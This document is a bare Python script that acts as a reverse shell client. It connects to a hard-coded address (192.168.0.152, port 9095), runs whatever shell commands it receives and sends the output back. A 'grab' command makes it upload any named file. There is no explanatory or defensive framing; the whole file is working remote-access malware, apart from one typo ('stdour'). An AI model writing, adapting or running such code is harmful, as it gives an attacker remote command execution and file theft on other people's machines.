import socket
import subprocess
import os

def transfer(s, path):
    if os.path.exists(path):
        f = open(path,'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
    else:
        s.send('File not Found'.encode())


def connecting():
    s = socket.socket()
    s.connect(("192.168.0.152", 9095))

    while True:
        command = s. recv(1024)

        if 'terminate' in command.decode():
            s.close()
            break
        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                transfer(s, path)
            except:
                pass
        else:
            cmd = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            s.send(cmd.stderr.read())
            s.send(cmd.stdour.read())

def main():
    connecting()
main()
